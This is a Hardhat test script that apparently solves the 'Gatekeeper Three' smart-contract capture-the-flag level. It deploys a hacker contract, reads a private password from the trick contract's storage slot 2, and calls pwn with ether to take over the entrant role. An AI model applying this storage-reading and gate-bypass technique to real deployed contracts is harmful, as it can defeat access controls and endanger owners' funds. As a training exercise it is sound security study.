const { expect } = require("chai");
const { ethers } = require("hardhat");
const {
    constants,
    expectRevert,
} = require('@openzeppelin/test-helpers');
require('dotenv').config({ path: __dirname + '/.env' });

const hre = require("hardhat");
describe.only("Gatekeeper Three", function() {
    beforeEach(async function() {
        [player] = await ethers.getSigners();
        hacker = await (await ethers.getContractFactory("GatekeeperThreeHacker")).deploy(process.env.GATEKEEPERTHREE_ADDRESS);
        hacker.deployed();
        gatekeeperThree = await ethers.getContractAt("GatekeeperThree", process.env.GATEKEEPERTHREE_ADDRESS);
});
    describe("Gatekeeper Three hack", function() {
        it("Should change entrant to player", async function() {
            await gatekeeperThree.createTrick();
            trickAddr = await gatekeeperThree.trick();
            password = await ethers.provider.getStorageAt(trickAddr, 2);
            await hacker.pwn(password, {value: ethers.utils.parseEther("0.0011")});
            expect(await gatekeeperThree.entrant()).to.equal(player.address);
        });
    });
});